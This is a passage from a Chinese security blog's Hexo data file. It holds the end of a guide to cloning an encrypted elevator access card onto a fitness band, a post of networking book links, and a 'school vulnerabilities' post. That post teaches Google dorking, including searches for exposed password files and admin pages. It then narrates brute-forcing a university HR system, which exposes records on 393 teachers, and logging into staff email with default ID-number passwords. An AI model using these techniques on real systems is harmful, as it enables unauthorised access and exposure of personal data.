src=\"/images/nfc/15.jpg\"></p>\n<p>选择keys文件后记得把加密的电梯卡贴到NFC手机,这样就会把所有数据识别到(包括之前1到15扇区无法读取的数据,因为我们之前选择了自己新建的keys文件)</p>\n<p><img src=\"/images/nfc/16.jpg\"></p>\n<center>图示:默认选择所有扇区，然后撤下电梯卡换上手环尝试写入数据.</center>\n\n<p>9、更换手环后不要随意移动手环,提示写入成功,那么手环基本复制完加密电梯卡了.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>由于电梯卡不是属于本人的,所以部分截图无法一一贴入,帮客户复制到手环的,但是听客户电话说手环成功刷电梯了,内心还是高兴的,毕竟也是大概搞了一周的时间才完成.哎呀,这效率惊人丫！！！</p>\n<p>1、为什么要把电梯卡内密钥块删除并拷贝到空UID内?</p>\n<p>​    其一:想尝试复制一张非加密的空UID卡,这样电梯卡和空的UID的UID号一致，测试是否可以刷电梯;</p>\n<p>​    其二:而且手环本身也要先模拟一张空的UID卡,因此干脆用这个了.</p>\n<p>​    结果:空的UID卡不能刷电梯的,尴尬😅</p>\n<p>2、原本用PM3去一键解析加密的电梯卡,可惜浪费了很久啊,而且还没解密成功;所以,建议大家直接买个PN532就行了.</p>\n<p>3、PN532识别到电梯加密数据、空白UID卡后建议各备份一份dump文件,后期恢复使用.</p>\n<p>4、MCT工具新建时粘贴的16进制数据是电梯卡内16个扇区内每块前12字符数据,(如果复制的数据量或长度不对软件会提示报错)</p>\n<p>5、MCT新建后记得点击新建keys文件后重新读取电梯卡,并发现除0扇区后其他扇区的所有数据是否补全.</p>\n<p>6、补全后点击右上角的”写转储”,这时提示所有扇区信息,然后尝试写入即可.</p>\n<p>7、写入完后,可以再使用软件读取手环内数据,如果软件识别后1-15扇区的数据显示无法获取key值,那么可以确定手环复制成功.</p>\n<p>8、关于智能卡的介绍及知识本人也在学习中,如果想学习了解更多可看下”参考”内的链接.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.bilibili.com/video/av33911423/?spm_id_from=333.788.videocard.0%C3%9F\">视屏教程参考</a></p>\n<p><a href=\"https://www.docin.com/p-2096377705.html\">PM3及相关类型卡介绍</a></p>\n<h2 id=\"其他方式及流程\"><a href=\"#其他方式及流程\" class=\"headerlink\" title=\"其他方式及流程\"></a>其他方式及流程</h2><p>0、以上工具除去PN532不用其他均需要</p>\n<p>1、删除小米运动手环模拟信息,重新模拟门禁卡;</p>\n<p>2、开始检测门禁卡,贴上空白UID卡,提示检测成功;</p>\n<p>3、点击开始模拟前,换上我们的电梯卡过去,应该提示模拟成功,输入名称即可.</p>\n<p>这个方法本人测试了,但是没有去尝试电梯刷手环测试;所以结果如何还是未知；但是个人觉得不靠谱,因为我们开始模拟的就是非加密类卡,即使后面再模拟,那手环内的数据应该还是空的UID卡内的数据.</p>\n"},{"title":"基础网络学习文档分享","date":"2019-08-13T05:32:48.000Z","_content":"基础网络学习主要是针对那些想学习计算机网络的同学所分享的学习文档,虽网上还有很多,但还是贴出来供大家参考、学习.\n\n## HTTP协议\n\n关于HTTP协议,网上有很多资料可以学习和参考,但这里推荐《图解HTTP协议》具体推荐理由就不多阐述了,下图:\n\n![](/images/ziliao/HTTP.jpg)\n\n## 网络是怎样连接的\n\n这本书主要从最基本的网络单节点到广域网的介绍,很适合初学者以及想从事互联网工作的小伙伴们,同时适合已经在互联网工作多年的大佬们作为\"复习\"资料进行学习.下图:\n\n![](/images/ziliao/network.jpg)\n\n## 有趣的二进制\n\n通过逆向工程，揭开人们熟知的软件背后的机器语言的秘密，并教给读者读懂这些二进制代码的方法。这本书更多还是带大家了解逆向的大概逻辑及分析方式，算是一本入门级书籍。\n\n![](/images/ziliao/pwn.jpg)\n\n## 下载\n\n[图解HTTP协议](http://www.si1ent.xyz/ziliao/图解HTTP.epub)\n\n[网络是怎样连接的](http://www.si1ent.xyz/ziliao/How-networks-work.pdf)\n\n[有趣的二进制-软件安全与逆向分析](http://www.si1ent.xyz/ziliao/有趣的二进制-软件安全与逆向分析.pdf)\n\n感谢🙏各大佬推荐后进行下载并学习,所以分享到Blog中;方便自己以后没事复习,也算做个备份了,一起学习、努力💪....","source":"_posts/基础网络学习文档分享.md","raw":"---\ntitle: 基础网络学习文档分享\ndate: 2019-08-13 13:32:48\n---\n基础网络学习主要是针对那些想学习计算机网络的同学所分享的学习文档,虽网上还有很多,但还是贴出来供大家参考、学习.\n\n## HTTP协议\n\n关于HTTP协议,网上有很多资料可以学习和参考,但这里推荐《图解HTTP协议》具体推荐理由就不多阐述了,下图:\n\n![](/images/ziliao/HTTP.jpg)\n\n## 网络是怎样连接的\n\n这本书主要从最基本的网络单节点到广域网的介绍,很适合初学者以及想从事互联网工作的小伙伴们,同时适合已经在互联网工作多年的大佬们作为\"复习\"资料进行学习.下图:\n\n![](/images/ziliao/network.jpg)\n\n## 有趣的二进制\n\n通过逆向工程，揭开人们熟知的软件背后的机器语言的秘密，并教给读者读懂这些二进制代码的方法。这本书更多还是带大家了解逆向的大概逻辑及分析方式，算是一本入门级书籍。\n\n![](/images/ziliao/pwn.jpg)\n\n## 下载\n\n[图解HTTP协议](http://www.si1ent.xyz/ziliao/图解HTTP.epub)\n\n[网络是怎样连接的](http://www.si1ent.xyz/ziliao/How-networks-work.pdf)\n\n[有趣的二进制-软件安全与逆向分析](http://www.si1ent.xyz/ziliao/有趣的二进制-软件安全与逆向分析.pdf)\n\n感谢🙏各大佬推荐后进行下载并学习,所以分享到Blog中;方便自己以后没事复习,也算做个备份了,一起学习、努力💪....","slug":"基础网络学习文档分享","published":1,"updated":"2020-10-23T02:29:22.751Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckglobhe2000ub1hq79y90z7k","content":"<p>基础网络学习主要是针对那些想学习计算机网络的同学所分享的学习文档,虽网上还有很多,但还是贴出来供大家参考、学习.</p>\n<h2 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h2><p>关于HTTP协议,网上有很多资料可以学习和参考,但这里推荐《图解HTTP协议》具体推荐理由就不多阐述了,下图:</p>\n<p><img src=\"/images/ziliao/HTTP.jpg\"></p>\n<h2 id=\"网络是怎样连接的\"><a href=\"#网络是怎样连接的\" class=\"headerlink\" title=\"网络是怎样连接的\"></a>网络是怎样连接的</h2><p>这本书主要从最基本的网络单节点到广域网的介绍,很适合初学者以及想从事互联网工作的小伙伴们,同时适合已经在互联网工作多年的大佬们作为”复习”资料进行学习.下图:</p>\n<p><img src=\"/images/ziliao/network.jpg\"></p>\n<h2 id=\"有趣的二进制\"><a href=\"#有趣的二进制\" class=\"headerlink\" title=\"有趣的二进制\"></a>有趣的二进制</h2><p>通过逆向工程，揭开人们熟知的软件背后的机器语言的秘密，并教给读者读懂这些二进制代码的方法。这本书更多还是带大家了解逆向的大概逻辑及分析方式，算是一本入门级书籍。</p>\n<p><img src=\"/images/ziliao/pwn.jpg\"></p>\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><p><a href=\"http://www.si1ent.xyz/ziliao/%E5%9B%BE%E8%A7%A3HTTP.epub\">图解HTTP协议</a></p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/How-networks-work.pdf\">网络是怎样连接的</a></p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.pdf\">有趣的二进制-软件安全与逆向分析</a></p>\n<p>感谢🙏各大佬推荐后进行下载并学习,所以分享到Blog中;方便自己以后没事复习,也算做个备份了,一起学习、努力💪….</p>\n","site":{"data":{}},"excerpt":"","more":"<p>基础网络学习主要是针对那些想学习计算机网络的同学所分享的学习文档,虽网上还有很多,但还是贴出来供大家参考、学习.</p>\n<h2 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h2><p>关于HTTP协议,网上有很多资料可以学习和参考,但这里推荐《图解HTTP协议》具体推荐理由就不多阐述了,下图:</p>\n<p><img src=\"/images/ziliao/HTTP.jpg\"></p>\n<h2 id=\"网络是怎样连接的\"><a href=\"#网络是怎样连接的\" class=\"headerlink\" title=\"网络是怎样连接的\"></a>网络是怎样连接的</h2><p>这本书主要从最基本的网络单节点到广域网的介绍,很适合初学者以及想从事互联网工作的小伙伴们,同时适合已经在互联网工作多年的大佬们作为”复习”资料进行学习.下图:</p>\n<p><img src=\"/images/ziliao/network.jpg\"></p>\n<h2 id=\"有趣的二进制\"><a href=\"#有趣的二进制\" class=\"headerlink\" title=\"有趣的二进制\"></a>有趣的二进制</h2><p>通过逆向工程，揭开人们熟知的软件背后的机器语言的秘密，并教给读者读懂这些二进制代码的方法。这本书更多还是带大家了解逆向的大概逻辑及分析方式，算是一本入门级书籍。</p>\n<p><img src=\"/images/ziliao/pwn.jpg\"></p>\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><p><a href=\"http://www.si1ent.xyz/ziliao/%E5%9B%BE%E8%A7%A3HTTP.epub\">图解HTTP协议</a></p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/How-networks-work.pdf\">网络是怎样连接的</a></p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.pdf\">有趣的二进制-软件安全与逆向分析</a></p>\n<p>感谢🙏各大佬推荐后进行下载并学习,所以分享到Blog中;方便自己以后没事复习,也算做个备份了,一起学习、努力💪….</p>\n"},{"title":"学校漏洞一点点思路...","date":"2019-04-02T15:14:34.000Z","_content":"之前了解到一个关于大学类的SRC可以访问这里[EDU-SRC](https://src.edu-info.edu.cn/),其他漏洞平台也会收这类漏洞,因此最近也开始学习总结测学校类方式.\n## 前言\n不多赘述关于非法攻击类非法行为会被请去喝茶的,总之,不要“日站一时爽,进去万分悔”.\n\n## 信息收集\n当我们确定待测学校后,自然少不了针对此系统的一系列信息收集工作;关于子域名爆破也好、还是通过其他类端口探测等收集方式也罢,而这里全程只使用Google Hacking进行大部分信息收集工作(以后要多使用).\n### Google Hacking\nGoogle Hacking:是利用谷歌搜索的强大,来在浩瀚的互联网中搜索到我们需要的信息.轻量级的搜索可以搜素出一些遗留后门,不想被发现的后台入口,中量级的搜索出一些用户信息泄露,源代码泄露,未授权访问等等,重量级的则可能是mdb文件下载,CMS 未被锁定install页面,网站配置密码,php远程文件包含漏洞等重要信息.\n\n#### 基本检索\n* 逻辑与: and\n* 逻辑或: or\n* 逻辑非: -\n* 完整匹配: \"关键词\"\n* 通配符: * ?\n* …\n* ……\n\n#### 高级检索\n\n```BASH\n1.intext\n```\n检索某个正文中含有关键字的网页,例如:intext:\"后台登录\",将只返回正文中包含后台登录的网页.\n\nintext:\"后台登陆\"\n\n![](/images/edu/1.png)\n\n```BASH\n2.intitle\n```\n检索标题中含有关键字的网页,例如:intitle:后台登录,将只返回标题中包含\"后台登录\"的网页,当然也可以使用其他关键字进行检索.\n\nintitle:\"后台登陆\"\n\n![](/images/edu/2.png)\n\n```BASH\n3.inurl\n```\n检索URL中包含关键词的网页:例如:inurl:Login,将返回URL中含有Login的网页,很多小伙伴应该还记得在学习SQL注入时这条检索应该运用很多次,inurl:php id=.\n\ninurl:login\n![](/images/edu/3.png)\n\n检索管理员登录页面\ninurl:/admin/login.php\n\n![](/images/edu/4.png)\n\n检索phpmyadmin管理页\ninurl:/phpmyadmin/index.php\n\n![](/images/edu/5.png)\n\n```BAHS\n4.site\n```\n检索指定域名/关键字,例如:site:baidu.com inurl:login,将只在baidu.com中检索含有Login的网页.\n\nsite:baidu.com inurl:login\n\n![](/images/edu/6.png)\n\n```BASH\n5.filetype\n```\n检索指定域名内的指定文件类型,例如:```site:baidu.com filetype:doc```,将返回baidu.com内且文件类型为doc的网页.\n\nsite:baidu.com filetype:doc\n\n![](/images/edu/7.png)\n\n```BASH\n6.link\n```\n检索指定域名的网页,例:```link:www.baidu.com```,将返回所有包含```www.baidu.com```关键字的网页.\n\n```\nlink:www.baidu.com\n```\n\n![](/images/edu/8.png)\n\n```BASH\n7.related\n```\n\n检索相似类型的网页,例如:```related:www.hebut.edu.cn```,将返回与```www.hebut.edu.cn```相似的页面,相似指的是网页的布局相似.\n\n```\nrelated:www.hebut.edu.cn\n```\n\n![](/images/edu/9.png)\n\n\n```BASH\n8.Index of\n```\nIndex of语法去发现允许目录浏览的web网站,就像在本地的普通目录一样,下面是一些有趣的查询.\n* index of /admin\n\n* index of /passwd\n\n* index of /password\n\n* index of /logs\n\n* index of /config\n\n* index of /mail\n\n* ....\n\n  index of /logs\n\n![](/images/edu/10.png)\n\n\n\n\n```BASH\n小姐(结)\n```\n关于Google Hacking还有很多可用语法使用,具体可以网上查找这里不做更深入介绍.已选择移步到:[Google Hacing DB](https://www.exploit-db.com/google-hacking-database).\n\n## 实战\n### 子域名收集\n\n![](/images/edu/11.png)\n\n找到一个HR系统\n针对学校的很多是工号进行登陆,检索学校老师工号两种方式:学校官网&其他系统、Google Hacking(企业类测试基本相符)\n\n```\nsite:XXXX.edu.cn intext:\"工号\"\n```\n![](/images/edu/12.png)\n### 获取工号\n尝试登陆,提示密码错误.\n![](/images/edu/13.png)\n\n### 爆破\n![](/images/edu/14.png)\n\n显示只是普通老师的个人信息,没什么利用价值, 看到审批信息需人事审核,想必人事可获取很多信息.\n\n### Google检索\n找到人事工号了\n(这里说下,这个学校的邮箱是通过工号作为前缀)\n\n![](/images/edu/15.png)\n\n### 爆破\n393条老师信息\n![](/images/edu/16.png)\n\n### 撸下邮箱\nGoogle后提示邮箱默认密码是身份证号后6位,借此之前hr系统内可以获取身份证号信息,随机登陆测试.\n![](/images/edu/17.png)\n\n## 总结\n不管是针对学校类还是企业的测试,弱口令总是存在,则测试中此漏洞的利用程度较高;其中以上大部分占比还是信息收集部分做了充足的准备.\n\n### 小建议\n1. 因这个测试基本都是使用Google Hacking测试,则在信息收集部分只做了此类部分介绍;其他类还请自行补充.(希望后期学习Google Hacking再单独贴出).\n2. 针对学校类测试建议多google、多查学校通知类文件信息,总有一款适合你.\n3. 如果企业的SRC挖不到或许可以通过测试学校类来学习更多方式吧,总之,多测、多练、多收集.\n4. 多看书,多学习,多总结,多笔记,多回顾,多完善....\n","source":"_posts/学校漏洞一点点思路.md","raw":"---\ntitle: 学校漏洞一点点思路...\ndate: 2019-04-02 23:14:34\ntags:\n - 渗透思路\n---\n之前了解到一个关于大学类的SRC可以访问这里[EDU-SRC](https://src.edu-info.edu.cn/),其他漏洞平台也会收这类漏洞,因此最近也开始学习总结测学校类方式.\n## 前言\n不多赘述关于非法攻击类非法行为会被请去喝茶的,总之,不要“日站一时爽,进去万分悔”.\n\n## 信息收集\n当我们确定待测学校后,自然少不了针对此系统的一系列信息收集工作;关于子域名爆破也好、还是通过其他类端口探测等收集方式也罢,而这里全程只使用Google Hacking进行大部分信息收集工作(以后要多使用).\n### Google Hacking\nGoogle Hacking:是利用谷歌搜索的强大,来在浩瀚的互联网中搜索到我们需要的信息.轻量级的搜索可以搜素出一些遗留后门,不想被发现的后台入口,中量级的搜索出一些用户信息泄露,源代码泄露,未授权访问等等,重量级的则可能是mdb文件下载,CMS 未被锁定install页面,网站配置密码,php远程文件包含漏洞等重要信息.\n\n#### 基本检索\n* 逻辑与: and\n* 逻辑或: or\n* 逻辑非: -\n* 完整匹配: \"关键词\"\n* 通配符: * ?\n* …\n* ……\n\n#### 高级检索\n\n```BASH\n1.intext\n```\n检索某个正文中含有关键字的网页,例如:intext:\"后台登录\",将只返回正文中包含后台登录的网页.\n\nintext:\"后台登陆\"\n\n![](/images/edu/1.png)\n\n```BASH\n2.intitle\n```\n检索标题中含有关键字的网页,例如:intitle:后台登录,将只返回标题中包含\"后台登录\"的网页,当然也可以使用其他关键字进行检索.\n\nintitle:\"后台登陆\"\n\n![](/images/edu/2.png)\n\n```BASH\n3.inurl\n```\n检索URL中包含关键词的网页:例如:inurl:Login,将返回URL中含有Login的网页,很多小伙伴应该还记得在学习SQL注入时这条检索应该运用很多次,inurl:php id=.\n\ninurl:login\n![](/images/edu/3.png)\n\n检索管理员登录页面\ninurl:/admin/login.php\n\n![](/images/edu/4.png)\n\n检索phpmyadmin管理页\ninurl:/phpmyadmin/index.php\n\n![](/images/edu/5.png)\n\n```BAHS\n4.site\n```\n检索指定域名/关键字,例如:site:baidu.com inurl:login,将只在baidu.com中检索含有Login的网页.\n\nsite:baidu.com inurl:login\n\n![](/images/edu/6.png)\n\n```BASH\n5.filetype\n```\n检索指定域名内的指定文件类型,例如:```site:baidu.com filetype:doc```,将返回baidu.com内且文件类型为doc的网页.\n\nsite:baidu.com filetype:doc\n\n![](/images/edu/7.png)\n\n```BASH\n6.link\n```\n检索指定域名的网页,例:```link:www.baidu.com```,将返回所有包含```www.baidu.com```关键字的网页.\n\n```\nlink:www.baidu.com\n```\n\n![](/images/edu/8.png)\n\n```BASH\n7.related\n```\n\n检索相似类型的网页,例如:```related:www.hebut.edu.cn```,将返回与```www.hebut.edu.cn```相似的页面,相似指的是网页的布局相似.\n\n```\nrelated:www.hebut.edu.cn\n```\n\n![](/images/edu/9.png)\n\n\n```BASH\n8.Index of\n```\nIndex of语法去发现允许目录浏览的web网站,就像在本地的普通目录一样,下面是一些有趣的查询.\n* index of /admin\n\n* index of /passwd\n\n* index of /password\n\n* index of /logs\n\n* index of /config\n\n* index of /mail\n\n* ....\n\n  index of /logs\n\n![](/images/edu/10.png)\n\n\n\n\n```BASH\n小姐(结)\n```\n关于Google Hacking还有很多可用语法使用,具体可以网上查找这里不做更深入介绍.已选择移步到:[Google Hacing DB](https://www.exploit-db.com/google-hacking-database).\n\n## 实战\n### 子域名收集\n\n![](/images/edu/11.png)\n\n找到一个HR系统\n针对学校的很多是工号进行登陆,检索学校老师工号两种方式:学校官网&其他系统、Google Hacking(企业类测试基本相符)\n\n```\nsite:XXXX.edu.cn intext:\"工号\"\n```\n![](/images/edu/12.png)\n### 获取工号\n尝试登陆,提示密码错误.\n![](/images/edu/13.png)\n\n### 爆破\n![](/images/edu/14.png)\n\n显示只是普通老师的个人信息,没什么利用价值, 看到审批信息需人事审核,想必人事可获取很多信息.\n\n### Google检索\n找到人事工号了\n(这里说下,这个学校的邮箱是通过工号作为前缀)\n\n![](/images/edu/15.png)\n\n### 爆破\n393条老师信息\n![](/images/edu/16.png)\n\n### 撸下邮箱\nGoogle后提示邮箱默认密码是身份证号后6位,借此之前hr系统内可以获取身份证号信息,随机登陆测试.\n![](/images/edu/17.png)\n\n## 总结\n不管是针对学校类还是企业的测试,弱口令总是存在,则测试中此漏洞的利用程度较高;其中以上大部分占比还是信息收集部分做了充足的准备.\n\n### 小建议\n1. 因这个测试基本都是使用Google Hacking测试,则在信息收集部分只做了此类部分介绍;其他类还请自行补充.(希望后期学习Google Hacking再单独贴出).\n2. 针对学校类测试建议多google、多查学校通知类文件信息,总有一款适合你.\n3. 如果企业的SRC挖不到或许可以通过测试学校类来学习更多方式吧,总之,多测、多练、多收集.\n4. 多看书,多学习,多总结,多笔记,多回顾,多完善....\n","slug":"学校漏洞一点点思路","published":1,"updated":"2020-10-23T03:30:07.677Z","_id":"ckglobhe2000vb1hq43uj3803","comments":1,"layout":"post","photos":[],"link":"","content":"<p>之前了解到一个关于大学类的SRC可以访问这里<a href=\"https://src.edu-info.edu.cn/\">EDU-SRC</a>,其他漏洞平台也会收这类漏洞,因此最近也开始学习总结测学校类方式.</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>不多赘述关于非法攻击类非法行为会被请去喝茶的,总之,不要“日站一时爽,进去万分悔”.</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>当我们确定待测学校后,自然少不了针对此系统的一系列信息收集工作;关于子域名爆破也好、还是通过其他类端口探测等收集方式也罢,而这里全程只使用Google Hacking进行大部分信息收集工作(以后要多使用).</p>\n<h3 id=\"Google-Hacking\"><a href=\"#Google-Hacking\" class=\"headerlink\" title=\"Google Hacking\"></a>Google Hacking</h3><p>Google Hacking:是利用谷歌搜索的强大,来在浩瀚的互联网中搜索到我们需要的信息.轻量级的搜索可以搜素出一些遗留后门,不想被发现的后台入口,中量级的搜索出一些用户信息泄露,源代码泄露,未授权访问等等,重量级的则可能是mdb文件下载,CMS 未被锁定install页面,网站配置密码,php远程文件包含漏洞等重要信息.</p>\n<h4 id=\"基本检索\"><a href=\"#基本检索\" class=\"headerlink\" title=\"基本检索\"></a>基本检索</h4><ul>\n<li>逻辑与: and</li>\n<li>逻辑或: or</li>\n<li>逻辑非: -</li>\n<li>完整匹配: “关键词”</li>\n<li>通配符: * ?</li>\n<li>…</li>\n<li>……</li>\n</ul>\n<h4 id=\"高级检索\"><a href=\"#高级检索\" class=\"headerlink\" title=\"高级检索\"></a>高级检索</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.intext</span><br></pre></td></tr></table></figure>\n<p>检索某个正文中含有关键字的网页,例如:intext:”后台登录”,将只返回正文中包含后台登录的网页.</p>\n<p>intext:”后台登陆”</p>\n<p><img src=\"/images/edu/1.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2.intitle</span><br></pre></td></tr></table></figure>\n<p>检索标题中含有关键字的网页,例如:intitle:后台登录,将只返回标题中包含”后台登录”的网页,当然也可以使用其他关键字进行检索.</p>\n<p>intitle:”后台登陆”</p>\n<p><img src=\"/images/edu/2.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3.inurl</span><br></pre></td></tr></table></figure>\n<p>检索URL中包含关键词的网页:例如:inurl:Login,将返回URL中含有Login的网页,很多小伙伴应该还记得在学习SQL注入时这条检索应该运用很多次,inurl:php id=.</p>\n<p>inurl:login<br><img src=\"/images/edu/3.png\"></p>\n<p>检索管理员登录页面<br>inurl:/admin/login.php</p>\n<p><img src=\"/images/edu/4.png\"></p>\n<p>检索phpmyadmin管理页<br>inurl:/phpmyadmin/index.php</p>\n<p><img src=\"/images/edu/5.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.site</span><br></pre></td></tr></table></figure>\n<p>检索指定域名/关键字,例如:site:baidu.com inurl:login,将只在baidu.com中检索含有Login的网页.</p>\n<p>site:baidu.com inurl:login</p>\n<p><img src=\"/images/edu/6.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.filetype</span><br></pre></td></tr></table></figure>\n<p>检索指定域名内的指定文件类型,例如:<code>site:baidu.com filetype:doc</code>,将返回baidu.com内且文件类型为doc的网页.</p>\n<p>site:baidu.com filetype:doc</p>\n<p><img src=\"/images/edu/7.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6.link</span><br></pre></td></tr></table></figure>\n<p>检索指定域名的网页,例:<code>link:www.baidu.com</code>,将返回所有包含<code>www.baidu.com</code>关键字的网页.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">link:www.baidu.com</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/edu/8.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7.related</span><br></pre></td></tr></table></figure>\n\n<p>检索相似类型的网页,例如:<code>related:www.hebut.edu.cn</code>,将返回与<code>www.hebut.edu.cn</code>相似的页面,相似指的是网页的布局相似.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">related:www.hebut.edu.cn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/edu/9.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8.Index of</span><br></pre></td></tr></table></figure>\n<p>Index of语法去发现允许目录浏览的web网站,就像在本地的普通目录一样,下面是一些有趣的查询.</p>\n<ul>\n<li><p>index of /admin</p>\n</li>\n<li><p>index of /passwd</p>\n</li>\n<li><p>index of /password</p>\n</li>\n<li><p>index of /logs</p>\n</li>\n<li><p>index of /config</p>\n</li>\n<li><p>index of /mail</p>\n</li>\n<li><p>….</p>\n<p>index of /logs</p>\n</li>\n</ul>\n<p><img src=\"/images/edu/10.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">小姐(结)</span><br></pre></td></tr></table></figure>\n<p>关于Google Hacking还有很多可用语法使用,具体可以网上查找这里不做更深入介绍.已选择移步到:<a href=\"https://www.exploit-db.com/google-hacking-database\">Google Hacing DB</a>.</p>\n<h2 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h2><h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p><img src=\"/images/edu/11.png\"></p>\n<p>找到一个HR系统<br>针对学校的很多是工号进行登陆,检索学校老师工号两种方式:学校官网&amp;其他系统、Google Hacking(企业类测试基本相符)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:XXXX.edu.cn intext:&quot;工号&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/edu/12.png\"></p>\n<h3 id=\"获取工号\"><a href=\"#获取工号\" class=\"headerlink\" title=\"获取工号\"></a>获取工号</h3><p>尝试登陆,提示密码错误.<br><img src=\"/images/edu/13.png\"></p>\n<h3 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h3><p><img src=\"/images/edu/14.png\"></p>\n<p>显示只是普通老师的个人信息,没什么利用价值, 看到审批信息需人事审核,想必人事可获取很多信息.</p>\n<h3 id=\"Google检索\"><a href=\"#Google检索\" class=\"headerlink\" title=\"Google检索\"></a>Google检索</h3><p>找到人事工号了<br>(这里说下,这个学校的邮箱是通过工号作为前缀)</p>\n<p><img src=\"/images/edu/15.png\"></p>\n<h3 id=\"爆破-1\"><a href=\"#爆破-1\" class=\"headerlink\" title=\"爆破\"></a>爆破</h3><p>393条老师信息<br><img src=\"/images/edu/16.png\"></p>\n<h3 id=\"撸下邮箱\"><a href=\"#撸下邮箱\" class=\"headerlink\" title=\"撸下邮箱\"></a>撸下邮箱</h3><p>Google后提示邮箱默认密码是身份证号后6位,借此之前hr系统内可以获取身份证号信息,随机登陆测试.<br><img src=\"/images/edu/17.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>不管是针对学校类还是企业的测试,弱口令总是存在,则测试中此漏洞的利用程度较高;其中以上大部分占比还是信息收集部分做了充足的准备.</p>\n<h3 id=\"小建议\"><a href=\"#小建议\" class=\"headerlink\" title=\"小建议\"></a>小建议</h3><ol>\n<li>因这个测试基本都是使用Google Hacking测试,则在信息收集部分只做了此类部分介绍;其他类还请自行补充.(希望后期学习Google Hacking再单独贴出).</li>\n<li>针对学校类测试建议多google、多查学校通知类文件信息,总有一款适合你.</li>\n<li>如果企业的SRC挖不到或许可以通过测试学校类来学习更多方式吧,总之,多测、多练、多收集.</li>\n<li>多看书,多学习,多总结,多笔记,多回顾,多完善….</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>之前了解到一个关于大学类的SRC可以访问这里<a href=\"https://src.edu-info.edu.cn/\">EDU-SRC</a>,其他漏洞平台也会收这类漏洞,因此最近也开始学习总结测学校类方式.</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>不多赘述关于非法攻击类非法行为会被请去喝茶的,总之,不要“日站一时爽,进去万分悔”.</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>当我们确定待测学校后,自然少不了针对此系统的一系列信息收集工作;关于子域名爆破也好、还是通过其他类端口探测等收集方式也罢,而这里全程只使用Google Hacking进行大部分信息收集工作(以后要多使用).</p>\n<h3 id=\"Google-Hacking\"><a href=\"#Google-Hacking\" class=\"headerlink\" title=\"Google Hacking\"></a>Google Hacking</h3><p>Google Hacking:是利用谷歌搜索的强大,来在浩瀚的互联网中搜索到我们需要的信息.轻量级的搜索可以搜素出一些遗留后门,不想被发现的后台入口,中量级的搜索出一些用户信息泄露,源代码泄露,未授权访问等等,重量级的则可能是mdb文件下载,CMS 